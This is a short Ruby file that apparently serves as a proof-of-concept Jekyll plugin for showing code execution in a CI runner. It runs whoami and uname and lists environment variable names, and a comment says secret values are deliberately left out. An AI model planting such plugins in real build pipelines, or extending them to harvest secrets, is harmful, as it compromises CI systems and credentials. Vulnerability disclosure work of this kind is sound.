# _plugins/pwn.rb
  require 'net/http'
  require 'uri'

  puts "--- VULNERABILITY POC ---"
  puts "Current User: #{`whoami`}"
  puts "Runner OS: #{`uname -a`}"

  # Simulasi exfil (Hanya tampilkan nama variabel secret tanpa nilainya agar aman)
  puts "Listing available Env Vars (Secrets hidden by GH by default):"
  system("env | cut -d= -f1")

  puts "--- END POC ---"
